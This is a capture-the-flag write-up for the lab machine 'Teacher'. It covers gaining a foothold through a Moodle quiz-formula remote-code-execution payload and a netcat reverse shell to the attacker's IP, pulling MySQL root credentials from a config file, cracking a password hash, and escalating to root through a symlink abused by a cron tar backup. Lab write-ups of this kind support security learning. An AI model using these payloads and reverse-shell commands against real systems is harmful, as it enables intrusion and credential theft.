@@ -1,0 +1,193 @@
+Teacher leave those kids alone dun dun dun dun we dont need no false control lolol
+
+/  __\/  __//  _ \  / \  /|/  _ \/ \   /    /  / \/ \  /|/__ __\/  __// \   / \   / \/  __//  __// \  /|/   _\/  __/  
+|  \/||  \  | | \|  | |  ||| / \|| |   |  __\  | || |\ ||  / \  |  \  | |   | |   | || |  _|  \  | |\ |||  /  |  \    
+|    /|  /_ | |_/|  | |/\||| \_/|| |_/\| |     | || | \||  | |  |  /_ | |_/\| |_/\| || |_//|  /_ | | \|||  \_ |  /_   
+\_/\_\\____\\____/  \_/  \|\____/\____/\_/     \_/\_/  \|  \_/  \____\\____/\____/\_/\____\\____\\_/  \|\____/\____\  
+                                                                                                                      
+
+Teacher writeup
+10.10.10.153
+Linux
+
+This one was fun and defintely learn something here lmfao never let your students near
+anything valuable they are creatures especially us hackers we get curious and next thing
+ya know pew pew exploit lmfao
+
+
+[=====================================User and foothold ==============================]
+
+Start by probing the box first step in every single situation so get use to it
+if you are learning from these pay attention to everything listening on services
+you just never know lol...
+
+
+here we good so 
+
+Right away you will see the only port is 80 and it is called BlackHat highschool lol
+and it is running apache and debian is the OS. 
+
+We travel to the site and use gobuster to get going on probing the webapp
+After probing around found something in one of the pictures 5.png there
+in the bare request you find a message there.
+
+It is from the service desk and they are reminding the teacher of the password
+and you must figure out the last char here is what they give you at first..
+
+----------------------------------------------------------------------------------------------------------
+
+Username - Giovanni
+Password - Th4C00lTheacha
+
+After this used a standard list of chars and got it :) [pound sign] hint hint lmfao
+
+So now we know there is admin section by probing we see there is a moodle admin area 
+and looks like we now have the right creds to login.
+
+After probing around moodle first thing that came to mind was hmm wander if there is a auth rce
+exploit for this bad boy and sure enough yay lol. 
+http://10.10.10.153/moodle
+Research yourself dude - https://blog.ripstech.com/2018/moodle-remote-code-execution/
+
+Ok so making moves we create a new quiz and follow suite from what we learned from the 
+article and sure enough by adding this in the math quiz
+
+/*{a*/`$_GET[0]`;//{x}}
+
+Save the quiz and follow lppsec's vids for visual if you cannot understand how it works
+by the articles out there. 
+
+Once saved at the end of the url on that landing page again for visual look to that for better guide
+as this is merely a writeup texted based for now. 
+
+placed this at the end of the URL
+
+0=(date; nc 10.10.12.184 1010 -e /bin/bash) 
+
+Others like lppsec have done it differently using burp and by hand more or less which again is a great lesson
+by me I took a quick and easy way just making a script and adding it to the end of the url. 
+
+Then upgrade shell
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+www-data@teacher:/$ [ we now have it :) ]
+
+Then began to probe the box as www-data user and wouldn't you know it
+in the config file for moodle for mysql I found a set of creds for the root user
+of mysql and started to probe for other creds laying around or anything useful
+
+----------------------------------------------------------------------------------------------------------]
+
+config file found contents in /var/www/html/ directory ...
+
+<?php  // Moodle configuration file
+
+unset($CFG);
+global $CFG;
+$CFG = new stdClass();
+
+$CFG->dbtype    = 'mariadb';
+$CFG->dblibrary = 'native';
+$CFG->dbhost    = 'localhost';
+$CFG->dbname    = 'moodle';
+$CFG->dbuser    = 'root';
+$CFG->dbpass    = 'Wel****';
+$CFG->prefix    = 'mdl_';
+$CFG->dboptions = array (
+  'dbpersist' => 0,
+  'dbport' => 3306,
+  'dbsocket' => '',
+  'dbcollation' => 'utf8mb4_unicode_ci',
+);
+
+$CFG->wwwroot   = 'http://10.10.10.153/moodle';
+$CFG->dataroot  = '/var/www/moodledata';
+$CFG->admin     = 'admin';
+
+$CFG->directorypermissions = 0777;
+-----------------------------------------------------------------------------------------------------------
+
+With the quickness logged into mysql and right away fired some commands to dig out
+anything I could - 
+
+mysql -u root -h localhost -p
+Wel****
+ 
+SELECT host, user, password FROM mysql.user;
+
+As you can see from running that command yourself find
+the entry for the giovanni user and you will see that user 
+when probing the box.
+
+7a860966115182402e**********
+
+Looks MD5 and right away cracked and bagged 7a860966115182402ed06375cf0a22af - exp*****
+
+Next move is on to ssh and logged into the box as the giovanni user finally
+and was able to get user.txt
+
+$ su giovanni
+su giovanni
+Password:
+
+giovanni@teacher:/home$ cd giovanni
+cd giovanni
+giovanni@teacher:~$ ls
+ls
+user.txt  work
+giovanni@teacher:~$ cat user.txt
+cat user.txt
+fa9ae187462530*****************
+
+
+Sweet now we have the user finally so lets move on and see what else we got going on 
+here on this box.
+
+[===root priv esc ======================================================================================]]]]
+
+So digging around I see a folder right away called work I also noticed some 
+commands I was able to sudo with like using tar and other commands so after 
+trying a million different things finding the backup script running in cron.
+
+I then began to think how I could exploit this and eventually led me to think
+of using symbolic link to link the root directory to the backup_courses
+
+drwxr-xr-x 3 giovanni giovanni 4.0K Mar 27 05:51 .
+drwxr-xr-x 4 giovanni giovanni 4.0K Jun 27  2018 ..
+-rwxrwxrwx 1 root     root      256 Mar 27 05:53 backup_courses.tar.gz
+lrwxrwxrwx 1 giovanni giovanni    5 Mar 27 05:51 courses -> /root
+drwxrwxrwx 3 root     root     4.0K Jun 27  2018 m
+
+Then made a sym link to the root directory and waited for the cron script to run.
+
+You can find the backup script in /usr/bin/backup.sh and notice the nuts and bolts of the script
+what it is doing.
+
+So fired up pspy and began to watch as you uses tar as root to execute the script.
+
+After all said and done here is my output and pew pew root it is and box terminated...
+
+By making our symbolic link like ln -s /root courses 
+
+You will be able to see as we add pictures and make the writup more visual coming soon!!
+
+giovanni@teacher:~/work$ cd tmp
+cd tmp
+giovanni@teacher:~/work/tmp$ ls
+ls
+backup_courses.tar.gz  courses  m
+giovanni@teacher:~/work/tmp$ cd courses
+cd courses
+giovanni@teacher:~/work/tmp/courses$ ls
+ls
+algebra  root.txt
+giovanni@teacher:~/work/tmp/courses$ cat root.txt
+cat root.txt
+4f3a83b42ac7723*****************
+---------------------------------------------------------------------------------------------------------
+
+take care of yourself and HTP.....
+
+C-3P0 
+Red Wolf Cyber Intelligence
